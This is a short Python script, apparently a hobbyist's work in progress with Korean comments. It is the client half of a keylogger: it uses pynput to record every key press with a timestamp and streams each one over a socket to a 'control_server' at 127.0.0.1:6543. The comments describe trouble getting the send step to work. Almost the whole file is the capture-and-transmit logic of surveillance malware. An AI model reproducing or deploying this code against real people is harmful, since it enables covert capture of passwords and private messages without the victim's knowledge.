# control_server와 연결된 클라이언트

from pynput.keyboard import Key, Listener
import time
import socket

client = socket.socket()

def on_press(key):
#    print("client 함수 호출 성공")
    
    result = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {key} \n"
    result = result.encode("utf8")

    
    client.send(result)
    #exit()
    #print(result)   # result도 잘 출력됨, send가 문제
    

def Conclient():    
    print("**Client has Successfully connected.**")
     
    client.connect(('127.0.0.1', 6543))

    with Listener(on_press=on_press) as listener:
        listener.join()
     

# Conclient 함수를 호출까지는 시켰는데,
# 각기 다른 함수에서 같은 변수를 사용하면서 어떻게 값을 send할 것인가 <<-- 해결 문제
# 서버와 클라이언트 연결까지 됨, send를 못하고 있음
# result값을 return을 못시켜주는 상황 !